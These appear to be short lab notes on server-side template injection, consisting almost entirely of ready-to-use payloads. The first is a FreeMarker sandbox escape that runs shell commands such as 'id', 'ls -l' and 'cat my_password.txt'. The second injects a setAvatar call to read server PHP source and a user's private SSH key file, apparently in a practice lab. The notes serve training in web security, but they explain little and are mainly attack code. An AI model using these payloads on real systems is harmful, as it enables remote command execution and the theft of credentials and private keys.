# SSTI : Server-side template injection 











### Server-side template injection in a sandboxed environment
Payload 
```html

<p>Hurry! Only ${product.stock} left of ${product.name} at ${product.price}.Hello 

<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}



<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("ls -l")}


<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("cat my_password.txt")}

</p>
```


###

Payload
```
1.Upload txt file and see the error

PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: text/plain in /home/carlos/User.php:28
Stack trace:
#0 /home/carlos/avatar_upload.php(19): User->setAvatar(('/tmp/hello.txt', 'text/plain'))
#1 {main}
  thrown in /home/carlos/User.php on line 28


blog-post-author-display=user.setAvatar('/home/carlos/avatar_upload.php',+'image/png')&csrf=XOL4b5UsK71HH2PxvpjIBq81N1qdKSYX





blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa',+'image/png')&csrf=XOL4b5UsK71HH2PxvpjIBq81N1qdKSYX






```